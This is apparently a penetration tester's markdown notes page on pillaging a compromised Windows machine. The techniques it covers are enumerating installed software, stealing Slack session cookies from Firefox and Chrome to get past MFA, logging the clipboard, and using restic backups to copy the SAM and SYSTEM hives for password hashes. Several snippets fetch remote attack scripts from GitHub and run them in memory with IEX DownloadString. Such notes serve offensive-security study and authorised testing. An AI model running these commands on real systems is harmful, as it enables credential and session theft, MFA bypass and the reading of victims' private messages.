---
tags: [privesc, windows]
aliases: [Pillaging]
---
Process of obtaining information from a compromised system. Anything from personal information to network details. 

We must understand which applications are installed on our compromised system.

```powershell
# common applications
dir "C:\Program Files"

# installed programs via regsitry keys
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```

# Abusing Cookies to get acess to IM Clients

Instant Messaging (IM) client like Slack and Microsoft Teams have become staples of modern office communications. Compromising a user account allows us to look for information in private chats and groups. We can either use the credentials of a user, but if the user uses any form of MFA we can instead try and steal the user's cookies to log in.

## Slack

Tool called [SlackExtract](https://github.com/clr2of8/SlackExtract) that is able to extract Slack messages using the user's authentication token in the cookie named `d`. We can also simply authenticate via a browser.

Firefox saves the cookies in an SQLite database file named `cookies.sqlite` placed in `%APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release`. 

```powershell
# copy cookie
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .

# extract cookie
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
```

Afterwards we can use any browser extension to manually add the cookie to our browser.

Chromium based browsers store cookies in a SQLite database as well but cookie is encrypted with  the Data Protection API (DPAPI). To get the cookie value we will need the decryption routine from the session of the user. We can do so with SharpChromium.

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
Invoke-SharpChromium -Command "cookies slack.com"
```

The cookie file location is hardcoded into SharpChromium but we can just copy it over to the desired location.

```powershell
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```

# Clipboard

Clipboard provides access to a significant amount of information. We can use a script to start a logger that extracts clipboard data.

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
Invoke-ClipboardLogger
```

# Roles and Services

## Backup Servers

Typically backup systems need an account to connect to the target machine and perform the backup, that backup account will usually need local administrative privileges on the target machine. If we gain access to a backup system we may be able to review backups.

Such a backup system typically used is called Restic, a modern backup programs that can backup practically any OS. 

Restic works with respositories (backup directory). It checks if the environment variable `RESTIC_PASSWORD` is set and uses it as the password for the registry.

```powershell
# initialize backup directory
mkdir E:\restic2; restic.exe -r E:\restic2 init

# back up a directory
$env:RESTIC_PASSWORD = 'Password'
restic.exe -r E:\restic2\ backup C:\SampleFolder

# back up a directory with vss
restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot

# check backups saved
restic.exe -r E:\restic2\ snapshots

# restore a backup with ID
restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore
```

On Windows we might want to look for the SAM and SYSTEM hives to extract local account hashes. 

## Related

- [[05-privilege-escalation/windows/credential-hunting|Credential Hunting]]
- [[password-spraying]]
- [[windows-old]]
- [[enumeration]]

